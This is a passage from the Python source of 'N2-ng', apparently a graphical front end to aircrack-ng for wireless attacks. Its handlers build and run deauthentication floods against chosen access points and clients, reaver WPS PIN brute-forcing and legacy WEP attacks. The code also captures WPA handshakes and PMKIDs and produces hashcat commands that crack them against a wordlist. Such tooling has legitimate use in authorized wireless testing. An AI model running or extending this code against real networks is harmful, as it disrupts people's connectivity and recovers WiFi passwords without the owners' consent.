            self.worker.start_scan(self.mon_iface, self.current_band.get(), scan_prefix())
            self.pause_btn.config(text="Pause Scan", state=tk.NORMAL)

    def _update_target_card(self, net: dict):
        lines = [
            f"ESSID: {net.get('essid', '[Hidden]')}",
            f"BSSID: {net['bssid']}",
            f"Channel: {net.get('channel', '')}",
            f"Power: {net.get('power', '')} dBm",
            f"Privacy: {net.get('privacy', '')} / {net.get('cipher', '')} / {net.get('auth', '')}",
        ]
        self.target_label.config(text="\n".join(lines))

    def _start_capture_size_monitor(self):
        if not self.locked_target:
            return
        # Find the latest .cap in the target directory
        base = capture_root() / sanitize_essid(self.locked_target["essid"], self.locked_target["bssid"])
        caps = sorted(base.glob("*.cap"))
        if caps:
            size = caps[-1].stat().st_size
            self.size_label.config(text=f"Capture: {human_size(size)}")
        if self.locked_target:
            self.root.after(1000, self._start_capture_size_monitor)

    def _poll_capture(self):
        if self.capture_manager:
            self.capture_manager.poll()
        if self.locked_target:
            self.root.after(5000, self._poll_capture)

    # ------------------------------------------------------------------
    # Attack handlers
    # ------------------------------------------------------------------
    def _our_mac(self) -> str | None:
        try:
            out = subprocess.check_output(["ip", "link", "show", self.mon_iface], text=True, stderr=subprocess.DEVNULL)
            m = re.search(r"link/ether\s+([0-9a-f:]{17})", out)
            if m:
                return m.group(1).upper()
        except Exception:
            pass
        return None

    def _confirm_attack(self, cmd: list[str]) -> bool:
        dlg = CountdownDialog(self.root, cmd)
        self.root.wait_window(dlg)
        return dlg.result

    def _deauth_all(self):
        if not self.locked_target or not self.mon_iface:
            messagebox.showwarning("N2-ng", "Lock a target first.")
            return
        bssid = self.locked_target["bssid"]
        cmd = ["aireplay-ng", "-0", "10", "-a", bssid, self.mon_iface]
        if self._confirm_attack(cmd):
            self.attack.deauth_all(bssid, self.mon_iface, count=10)

    def _deauth_client(self):
        if not self.locked_target or not self.mon_iface:
            messagebox.showwarning("N2-ng", "Lock a target first.")
            return
        item = self.client_tree.selection()
        if not item:
            messagebox.showwarning("N2-ng", "Select a client from the table.")
            return
        client = self.client_tree.item(item[0], "values")[0]
        self._deauth_client_by_station(client)

    def _deauth_client_by_station(self, client: str):
        if not self.locked_target or not self.mon_iface:
            messagebox.showwarning("N2-ng", "Lock a target first.")
            return
        bssid = self.locked_target["bssid"]
        cmd = ["aireplay-ng", "-0", "10", "-a", bssid, "-c", client, self.mon_iface]
        if self._confirm_attack(cmd):
            self.attack.deauth_client(bssid, client, self.mon_iface, count=10)

    def _reaver_attack(self):
        if not self.locked_target or not self.mon_iface:
            messagebox.showwarning("N2-ng", "Lock a target first.")
            return
        bssid = self.locked_target["bssid"]
        channel = str(self.locked_target.get("channel", ""))
        cmd = ["reaver", "-i", self.mon_iface, "-b", bssid, "-c", channel, "-vv"]
        if self._confirm_attack(cmd):
            self.attack.reaver(bssid, channel, self.mon_iface)

    def _stop_attack(self):
        self.auto_deauth_var.set(False)
        stopped = self.attack.stop_current()
        text = "Attack stopped" if stopped else "No attack process running"
        self.status.config(text=text, bg=THEME["panel"], fg=THEME["fg"])
        self._log(text)

    def _legacy_attack(self, kind: str):
        if not self.locked_target or not self.mon_iface:
            messagebox.showwarning("N2-ng", "Lock a target first.")
            return
        our_mac = self._our_mac()
        if not our_mac:
            messagebox.showwarning("N2-ng", "Could not determine our MAC address.")
            return
        bssid = self.locked_target["bssid"]
        flag = {"fakeauth": "-1", "arpreplay": "-3", "chopchop": "-4", "fragmentation": "-5"}[kind]
        if kind == "fakeauth":
            cmd = ["aireplay-ng", flag, "0", "-a", bssid, "-h", our_mac, self.mon_iface]
        else:
            cmd = ["aireplay-ng", flag, "-b", bssid, "-h", our_mac, self.mon_iface]
        if self._confirm_attack(cmd):
            self.attack.legacy_attack(kind, bssid, our_mac, self.mon_iface)

    # ------------------------------------------------------------------
    # Queue / network updates
    # ------------------------------------------------------------------
    def _poll_queue(self):
        """Loop B: fixed-rate display refresh, independent of capture.

        Reads the latest parsed data from the worker's shared buffer and
        re-renders the UI at ~6.7 FPS.  One-off events (handshake/pmkid/
        errors) are drained from the queue without blocking on capture.
        """
        # Always refresh display from the shared buffer.
        if self.worker:
            networks, clients = self.worker.get_latest()
            self._update_networks(networks)
            self._update_clients(clients)

        # Drain asynchronous events.
        while not self.queue.empty():
            try:
                event, payload = self.queue.get_nowait()
            except queue.Empty:
                break
            if event == "handshake":
                self._notify_capture("WPA Handshake Captured", payload["file"])
            elif event == "pmkid":
                self._notify_capture("PMKID Captured", payload["file"])
            elif event == "error":
                self._log(f"ERROR: {payload}")

        # Update Raw View if it exists.
        if self.raw_view:
            self.raw_view.append_lines(self.worker.get_raw_lines())
            self.raw_view.flush()

        self.poll_id = self.root.after(150, self._poll_queue)

    def _notify_capture(self, title: str, path: str):
        self.status.config(text=f"{title}: {path}", bg="green", fg="black")
        self._log(f"{title}: {path}")
        messagebox.showinfo(title, f"{title}\n\nFile: {path}")
        self._refresh_history()

    def _refresh_history(self):
        self.history_list.delete(0, tk.END)
        base = capture_root()
        if not base.exists():
            return
        for cap in sorted(base.rglob("*.cap")):
            self.history_list.insert(tk.END, str(cap))

    def _on_history_right_click(self, event):
        idx = self.history_list.nearest(event.y)
        if idx < 0:
            return
        self.history_list.selection_clear(0, tk.END)
        self.history_list.selection_set(idx)
        cap_path = Path(self.history_list.get(idx))
        menu = tk.Menu(self.root, tearoff=0, bg=THEME["panel"], fg=THEME["fg"])
        menu.add_command(label="Copy hashcat command", command=lambda: self._copy_hashcat_cmd(cap_path))
        menu.add_command(label="Copy .22000 content", command=lambda: self._copy_22000(cap_path))
        menu.add_command(label="Fix capture", command=lambda: self._fix_capture(cap_path))
        menu.add_command(label="Merge selected", command=self._merge_selected)
        self._post_context_menu(menu, event.x_root, event.y_root)

    def _copy_hashcat_cmd(self, cap: Path):
        hash22000 = cap.with_suffix(".22000")
        if not hash22000.exists():
            converted = self.capture_manager.convert(cap) if self.capture_manager else None
            if not converted:
                messagebox.showwarning("N2-ng", "No .22000 file found and conversion failed.")
                return
            hash22000 = converted
        cmd = f"hashcat -m 22000 {hash22000} /usr/share/wordlists/rockyou.txt"
        self._copy_to_clipboard(cmd)
        self._log(f"Copied hashcat command for {cap.name}")

    def _copy_22000(self, cap: Path):
        hash22000 = cap.with_suffix(".22000")
        if not hash22000.exists():
            converted = self.capture_manager.convert(cap) if self.capture_manager else None
            if not converted:
                messagebox.showwarning("N2-ng", "No .22000 file found and conversion failed.")
                return
            hash22000 = converted
        text = hash22000.read_text(errors="ignore")
        self._copy_to_clipboard(text)
        self._log(f"Copied .22000 content for {cap.name}")

    def _fix_capture(self, cap: Path):
        if not self.capture_manager:
            return
        fixed = self.capture_manager.fix(cap)
        if fixed:
            messagebox.showinfo("N2-ng", f"Fixed capture saved to:\n{fixed}")
            self._log(f"Fixed {cap.name} -> {fixed.name}")
            self._refresh_history()
        else:
            messagebox.showwarning("N2-ng", "pcapfix failed or not installed.")

    def _merge_selected(self):
        indices = self.history_list.curselection()
        if len(indices) < 2:
            messagebox.showwarning("N2-ng", "Select at least two captures to merge.")
            return
        caps = [Path(self.history_list.get(i)) for i in indices]
        out = caps[0].with_suffix(".merged.cap")
        if self.capture_manager and self.capture_manager.merge(caps, out):
            messagebox.showinfo("N2-ng", f"Merged capture saved to:\n{out}")
            self._log(f"Merged {len(caps)} captures -> {out.name}")
            self._refresh_history()
        else:
            messagebox.showwarning("N2-ng", "mergecap failed or not installed.")

    def _update_clients(self, clients: list[dict]):
        self.clients = clients
        selected = set(self.client_tree.selection())
        if not self.locked_target:
            self.client_tree.delete(*self.client_tree.get_children())
            return
        target_bssid = self.locked_target["bssid"]
        target_essid = self.locked_target.get("essid", "")
        wanted = set()
        for c in clients:
            bssid = c.get("bssid", "")
            probed = c.get("probed", "")
            matches = bssid == target_bssid
            if not matches and target_essid and target_essid != "[Hidden]":
                matches = target_essid in probed
            if bssid == "(not associated)" and target_essid and target_essid in probed:
                matches = True
            if matches:
                station = c.get("station", "")
                if not station:
                    continue
                values = (station, c.get("power", ""), c.get("packets", ""), c.get("probed", ""))
                wanted.add(station)
                if self.client_tree.exists(station):
                    self.client_tree.item(station, values=values)
                else:
                    self.client_tree.insert("", tk.END, iid=station, values=values)
        for iid in list(self.client_tree.get_children()):
            if iid not in wanted:
                self.client_tree.delete(iid)
        for iid in selected:
            if self.client_tree.exists(iid):
                self.client_tree.selection_add(iid)

    def _update_networks(self, networks: list[dict]):
        for net in networks:
            bssid = net["bssid"]
            old = self.networks.get(bssid)
            if old and old.get("essid") == "[Hidden]" and net.get("essid") and net.get("essid") != "[Hidden]":
                self._log(f"Revealed hidden ESSID: {net['essid']} ({bssid})")
            self.networks[bssid] = net
            self._networks_prev[bssid] = {"power": net.get("power", ""), "beacons": net.get("beacons", "")}
            if self.locked_target and self.locked_target["bssid"] == bssid:
                self.locked_target = net
                self._update_target_card(net)
                self.signal_graph.add_sample(net.get("power", -100))
        self._refresh_tree()

    def _filter_networks(self, networks: list[dict]) -> list[dict]:
        filt = self.settings.get("filter_encryption")
        if filt == "All":
            return networks
        result = []
        for net in networks:
            p = net.get("privacy", "").upper()
            if filt == "WEP only" and "WEP" in p:
                result.append(net)
            elif filt == "WPA/WPA2 only" and ("WPA" in p or "WPA2" in p) and "WPA3" not in p:
                result.append(net)
            elif filt == "WPA3 only" and "WPA3" in p:
                result.append(net)
            elif filt == "Open only" and (not p or p == "OPN"):
                result.append(net)
        return result

    def _sort_networks(self, networks: list[dict]) -> list[dict]:
        sort_key = self.settings.get("sort_by")
        key_map = {
            "PWR": "power",
            "Beacons": "beacons",
            "#Data": "iv",
            "CH": "channel",
            "ESSID": "essid",
            "BSSID": "bssid",
        }
        col = key_map.get(sort_key, "power")
        reverse = True
        if col in ("essid", "bssid"):
            reverse = False

        def sort_val(net):
            raw = net.get(col, "")
            if col in ("power", "beacons", "iv", "channel"):
                try:
                    return int(raw)
                except (TypeError, ValueError):
                    return -9999
            return str(raw).lower()

        return sorted(networks, key=sort_val, reverse=reverse)

    def _network_values(self, net: dict) -> tuple:
        if self.settings.get("show_manufacturers"):
            return (
                net.get("power", ""), net.get("beacons", ""), net.get("iv", ""),
                net.get("channel", ""), net.get("speed", ""), net.get("privacy", ""),
                net.get("cipher", ""), net.get("auth", ""), net.get("manufacturer", ""),
                net.get("essid", ""), net["bssid"],
            )
        return (
            net.get("power", ""), net.get("beacons", ""), net.get("iv", ""),
            net.get("channel", ""), net.get("speed", ""), net.get("privacy", ""),
            net.get("cipher", ""), net.get("auth", ""), net.get("essid", ""), net["bssid"],
        )

    def _refresh_tree(self, flash_bssids: set[str] | None = None, force_sort: bool = False):
        # Refresh the tree in-place to avoid full rebuild flicker at 6-7 FPS.
        selected = set(self.tree.selection())
        networks = list(self.networks.values())
        networks = self._filter_networks(networks)
        if force_sort or self.settings.get("realtime_sort"):
            networks = self._sort_networks(networks)
        else:
            by_bssid = {net["bssid"]: net for net in networks}
            existing = [by_bssid.pop(iid) for iid in self.tree.get_children() if iid in by_bssid]
            networks = existing + list(by_bssid.values())
        wanted = {net["bssid"] for net in networks}

        # Remove rows that no longer pass filter/sort.
        for iid in list(self.tree.get_children()):
            if iid not in wanted:
                self.tree.delete(iid)

        # Insert new or update existing rows.
        for net in networks:
            bssid = net["bssid"]
            values = self._network_values(net)
            tag = self._privacy_tag(net.get("privacy", ""))
            tags = (tag,)
            if self.tree.exists(bssid):
                self.tree.item(bssid, values=values, tags=tags)
            else:
                self.tree.insert("", tk.END, iid=bssid, values=values, tags=tags)
            self.tree.move(bssid, "", len(self.tree.get_children()))

        # Restore selection if item still exists.
        for bssid in selected:
            if self.tree.exists(bssid):
                self.tree.selection_add(bssid)

        # Color config
        self.tree.tag_configure("OPN", foreground="#00ff41")
        self.tree.tag_configure("WEP", foreground="#ff4444")
        self.tree.tag_configure("WPA", foreground="#ffcc00")
        self.tree.tag_configure("WPA2", foreground="#ffffff")
        self.tree.tag_configure("WPA3", foreground="#00ccff")

    @staticmethod
    def _privacy_tag(privacy: str) -> str:
        p = privacy.upper()
        if "WPA3" in p:
            return "WPA3"
        if "WPA2" in p:
            return "WPA2"
        if "WPA" in p:
            return "WPA"
        if "WEP" in p:
            return "WEP"
        return "OPN"

    def _log(self, msg: str):
        ts = time.strftime("%H:%M:%S")
        if hasattr(self, "log_text") and self.log_text.winfo_exists():
            self.log_text.config(state=tk.NORMAL)
            self.log_text.insert(tk.END, f"[{ts}] {msg}\n")
            self.log_text.see(tk.END)
            self.log_text.config(state=tk.DISABLED)
        # Also mirror to stdout for debugging
        print(f"[{ts}] {msg}")

    # ------------------------------------------------------------------
    # Cleanup
    # ------------------------------------------------------------------
    def _on_close(self):
        self._cleanup()
        self.root.destroy()

    def _cleanup(self):
        if self.poll_id:
            self.root.after_cancel(self.poll_id)
            self.poll_id = None
        self.worker.shutdown()
        self.airmon.cleanup()

    def run(self):
        self.root.mainloop()


def ensure_root():
    if os.geteuid() == 0:
        return
    root = tk.Tk()
    root.withdraw()
    pwd = simpledialog.askstring(
        "N2-ng requires root",
        "Enter sudo password:",
        show="*",
        parent=root,
    )
    root.destroy()
    if not pwd:
        messagebox.showerror("N2-ng", "Root privileges are required.")
        sys.exit(1)
    script = os.path.abspath(sys.argv[0])
    args = ["sudo", "-S", sys.executable, script] + sys.argv[1:]
    proc = subprocess.Popen(
        args,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    out, err = proc.communicate(input=pwd + "\n")
    sys.stdout.write(out)
    sys.stderr.write(err)
    sys.exit(proc.returncode)


def main():
    ensure_root()
    root = tk.Tk()
    root.withdraw()
    splash = DependencySplash(root)
    if not splash.run():
        root.destroy()
        sys.exit(1)
    app = N2NgApp(root)
    root.deiconify()
    app.run()


if __name__ == "__main__":
    main()
